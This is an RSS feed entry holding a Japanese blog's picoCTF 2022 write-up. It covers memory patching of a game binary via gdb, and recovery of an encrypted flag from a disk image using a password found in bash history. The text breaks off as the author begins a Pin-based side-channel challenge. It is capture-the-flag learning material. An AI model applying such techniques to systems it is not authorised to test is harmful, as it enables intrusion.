<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[かえるのひみつきち]]></title><description><![CDATA[かえるのひみつきち]]></description><link>https://kashiwaba-yuki.com</link><generator>GatsbyJS</generator><lastBuildDate>Tue, 24 May 2022 12:40:27 GMT</lastBuildDate><item><title><![CDATA[PicoCTF 2022 Writeup]]></title><link>https://kashiwaba-yuki.com/ctf-picoctf-2022</link><guid isPermaLink="false">https://kashiwaba-yuki.com/ctf-picoctf-2022</guid><pubDate>Wed, 30 Mar 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://play.picoctf.org/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;picoCTF2022&lt;/a&gt;に参加していました。&lt;/p&gt;
&lt;p&gt;今回は普段解いてるRev以外にもForensicとPwn問にも挑戦してみました。&lt;/p&gt;
&lt;p&gt;RevとForensicは全完できましたが、残念ながらPwnは2問残しました。&lt;/p&gt;
&lt;p&gt;とはいえ、新しいテクニックも3つくらい習得できてかなり有意義でした。&lt;/p&gt;
&lt;p&gt;この記事では個人的に学びのあった問題に簡単にWriteupを書いていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#rev&quot;&gt;Rev&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#wizardlikerev&quot;&gt;Wizardlike(Rev)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#forensic&quot;&gt;Forensic&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#operation-orchidforensic&quot;&gt;Operation Orchid(Forensic)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#sidechannelsidechannel&quot;&gt;SideChannel(SideChannel)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#pwn&quot;&gt;Pwn&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#function-overwritepwn&quot;&gt;function overwrite(Pwn)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ropfupwn&quot;&gt;ropfu(Pwn)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;rev&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#rev&quot; aria-label=&quot;rev permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Rev&lt;/h2&gt;
&lt;p&gt;Revは正直かなり難易度が低かったのでこれといって書くことがないですが、最後の問題は珍しいタイプで結構面白かったのでまとめておきます。&lt;/p&gt;
&lt;h3 id=&quot;wizardlikerev&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#wizardlikerev&quot; aria-label=&quot;wizardlikerev permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Wizardlike(Rev)&lt;/h3&gt;
&lt;p&gt;以下のような問題でした。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;description&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#description&quot; aria-label=&quot;description permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Description&lt;/h4&gt;
&lt;p&gt;Do you seek your destiny in these deplorable dungeons? If so, you may want to look elsewhere. Many have gone before you and honestly, they’ve cleared out the place of all monsters, ne’erdowells, bandits and every other sort of evil foe. The dungeons themselves have seen better days too. There’s a lot of missing floors and key passages blocked off. You’d have to be a real wizard to make any progress in this sorry excuse for a dungeon!Download the &lt;a href=&quot;https://artifacts.picoctf.net/c/153/game&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;game&lt;/a&gt;.’&lt;code class=&quot;language-text&quot;&gt;w&lt;/code&gt;’, ’&lt;code class=&quot;language-text&quot;&gt;a&lt;/code&gt;’, ’&lt;code class=&quot;language-text&quot;&gt;s&lt;/code&gt;’, ’&lt;code class=&quot;language-text&quot;&gt;d&lt;/code&gt;’ moves your character and ’&lt;code class=&quot;language-text&quot;&gt;Q&lt;/code&gt;’ quits. You’ll need to improvise some wizardly abilities to find the flag in this dungeon crawl. ’&lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt;’ is floor, ’&lt;code class=&quot;language-text&quot;&gt;#&lt;/code&gt;’ are walls, ’&lt;code class=&quot;language-text&quot;&gt;&amp;lt;&lt;/code&gt;’ are stairs up to previous level, and ’&lt;code class=&quot;language-text&quot;&gt;&gt;&lt;/code&gt;’ are stairs down to next level.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;コンソール上で遊べるドル○ーガの塔みたいなゲームが問題バイナリとして渡されます。&lt;/p&gt;
&lt;p&gt;このゲームの塔を登っていくとFlagがわかっていくという問題なのですが、残念ながら普通にプレイしているだけでは上ることのできない構造になっています。&lt;/p&gt;
&lt;p&gt;そのため、ゲーム中の階層と座標の格納されているメモリアドレスを特定して任意に改ざんしていくことで、マップ内をワープしながら探索していくというのが恐らく想定解の問題です。&lt;/p&gt;
&lt;p&gt;階層と座標のメモリアドレス自体はGhidraなどでデコンパイルすれば簡単に取得できます。&lt;/p&gt;
&lt;p&gt;ゲーム中にメモリアドレスを改ざんする方法としては、gdbのリモートデバッグを使用しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# gdbserverを使用してゲームを起動&lt;/span&gt;
gdbserver localhost:1234 game-p

&lt;span class=&quot;token comment&quot;&gt;# 別のコンソールからgdbを起動して接続&lt;/span&gt;
gdb
target remote localhost:1234&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これで階層やマップを移動しながら問題を解くことができます。&lt;/p&gt;
&lt;p&gt;ただし、残念なことにこのマップ移動時の座標指定はエスパー要素が強く結構面倒でした。&lt;/p&gt;
&lt;p&gt;そのため、最終的にはGhidraでデータセクション内の各マップの情報を特定し、ゲームのマップ更新時のプログラムからリバーシングした以下のスクリプトですべてのマップをまとめて取得する方法でFlagを取得しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; pprint &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; pprint

table &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; j &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;MapData&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; end&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;forensic&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#forensic&quot; aria-label=&quot;forensic permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Forensic&lt;/h2&gt;
&lt;p&gt;Forensic問ではいくつか新しいテクニックを習得したので、記録としてまとめておきます。&lt;/p&gt;
&lt;h3 id=&quot;operation-orchidforensic&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#operation-orchidforensic&quot; aria-label=&quot;operation orchidforensic permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Operation Orchid(Forensic)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;description-1&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#description-1&quot; aria-label=&quot;description 1 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Description&lt;/h4&gt;
&lt;p&gt;Download this disk image and find the flag.Note: if you are using the webshell, download and extract the disk image into &lt;code class=&quot;language-text&quot;&gt;/tmp&lt;/code&gt; not your home directory.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;類問として「Operation Oni」という問題もありましたが、イメージファイルから欲しい情報を探し出す問題でした。&lt;/p&gt;
&lt;p&gt;基本的な流れとしては、イメージファイルの中からマウント可能なセクションを特定してローカルにマウントし、ディレクトリを探索していく感じでした。&lt;/p&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;fdisk -lu&lt;/code&gt;コマンドでイメージファイルの情報を特定します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;fdisk&lt;/span&gt; -lu disk.img
Disk disk.img: &lt;span class=&quot;token number&quot;&gt;400&lt;/span&gt; MiB, &lt;span class=&quot;token number&quot;&gt;419430400&lt;/span&gt; bytes, &lt;span class=&quot;token number&quot;&gt;819200&lt;/span&gt; sectors
Units: sectors of &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; * &lt;span class=&quot;token number&quot;&gt;512&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;512&lt;/span&gt; bytes
Sector size &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;logical/physical&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;token number&quot;&gt;512&lt;/span&gt; bytes / &lt;span class=&quot;token number&quot;&gt;512&lt;/span&gt; bytes
I/O size &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;minimum/optimal&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;token number&quot;&gt;512&lt;/span&gt; bytes / &lt;span class=&quot;token number&quot;&gt;512&lt;/span&gt; bytes
Disklabel type: dos
Disk identifier: 0xb11a86e3
Device     Boot  Start    End Sectors  Size Id Type
disk.img1  *      &lt;span class=&quot;token number&quot;&gt;2048&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;206847&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;204800&lt;/span&gt;  100M &lt;span class=&quot;token number&quot;&gt;83&lt;/span&gt; Linux
disk.img2       &lt;span class=&quot;token number&quot;&gt;206848&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;411647&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;204800&lt;/span&gt;  100M &lt;span class=&quot;token number&quot;&gt;82&lt;/span&gt; Linux swap / Solaris
disk.img3       &lt;span class=&quot;token number&quot;&gt;411648&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;819199&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;407552&lt;/span&gt;  199M &lt;span class=&quot;token number&quot;&gt;83&lt;/span&gt; Linux&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;disk.img3&lt;/code&gt;をマウントしたかったので、開始セクタ番号の&lt;code class=&quot;language-text&quot;&gt;411648&lt;/code&gt;にセクタサイズの&lt;code class=&quot;language-text&quot;&gt;512&lt;/code&gt;をかけた値をオフセットとして&lt;code class=&quot;language-text&quot;&gt;mount&lt;/code&gt;コマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mount&lt;/span&gt; -o loop,offset&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;210763776&lt;/span&gt; disk.img ./mnt
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;chown&lt;/span&gt; ubuntu:ubuntu ./* -R&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ついでに所有者を変えておくと探索が楽になります。&lt;/p&gt;
&lt;p&gt;これでマウントしたディレクトリを探索したところ、&lt;code class=&quot;language-text&quot;&gt;.bash_history&lt;/code&gt;から以下のコマンド履歴が見つかりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;nano&lt;/span&gt; flag.txt 
openssl
openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567
shred -u flag.txt
&lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -al&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;つまり、この&lt;code class=&quot;language-text&quot;&gt;unbreakablepassword1234567&lt;/code&gt;を用いて&lt;code class=&quot;language-text&quot;&gt;aes256&lt;/code&gt;で暗号化されたファイルを復元するとFlagがゲットできます。&lt;/p&gt;
&lt;p&gt;というわけで以下のコマンドで復号を行いました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;openssl aes256 -d -salt -in flag.txt.enc -out flag.txt -k unbreakablepassword1234567&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでFlagが取れます。&lt;/p&gt;
&lt;h3 id=&quot;sidechannelsidechannel&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#sidechannelsidechannel&quot; aria-label=&quot;sidechannelsidechannel permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SideChannel(SideChannel)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;description-2&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#description-2&quot; aria-label=&quot;description 2 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Description&lt;/h4&gt;
&lt;p&gt;There’s something fishy about this PIN-code checker, can you figure out the PIN and get the flag?Download the PIN checker program here &lt;a href=&quot;https://artifacts.picoctf.net/c/146/pin_checker&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;pin_checker&lt;/a&gt;Once you’ve figured out the PIN (and gotten the checker program to accept it), connect to the master server using &lt;code class=&quot;language-text&quot;&gt;nc saturn.picoctf.net 50562&lt;/code&gt; and provide it the PIN to get your flag.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;これは解き方はわかったものの実際にFlagを取るのにかなり苦労した問題でしたが非常に面白い問題でした。&lt;/p&gt;
&lt;p&gt;まずは、&lt;a href=&quot;https://www.intel.com/content/www/us/en/developer/articles/tool/pin-a-binary-instrumentation-tool-downloads.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Pin - A Binary Instrumentation Tool - Downloads&lt;/a&gt;からPinToolをダウンロードします。&lt;/p&gt;
&lt;p&gt;ダウンロードしたファイルを展開するとこんな感じのディレクトリが作成されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -l
total &lt;span class=&quot;token number&quot;&gt;388&lt;/span&gt;
-rw-r--r-- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; ubuntu ubuntu  &lt;span class=&quot;token number&quot;&gt;63816&lt;/span&gt; Feb &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt; 02:04 README
drwxr-x--- &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; ubuntu ubuntu   &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Feb &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt; 02:14 doc
drwxr-x--- &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt; ubuntu ubuntu   &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Feb &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt; 02:14 extras
drwxr-x--- &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; ubuntu ubuntu   &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Feb &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt; 02:12 ia32
drwxr-x--- &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; ubuntu ubuntu   &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Feb &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt; 02:14 intel64
drwxr-xr-x &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; ubuntu ubuntu   &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Feb &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt; 02:14 licensing
-rwxr-xr-x &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; ubuntu ubuntu &lt;span class=&quot;token number&quot;&gt;292996&lt;/span&gt; Feb &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt; 02:09 pin
-rwxr-x--- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; ubuntu ubuntu   &lt;span class=&quot;token number&quot;&gt;8418&lt;/span&gt; Feb &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt; 02:15 pin.sig
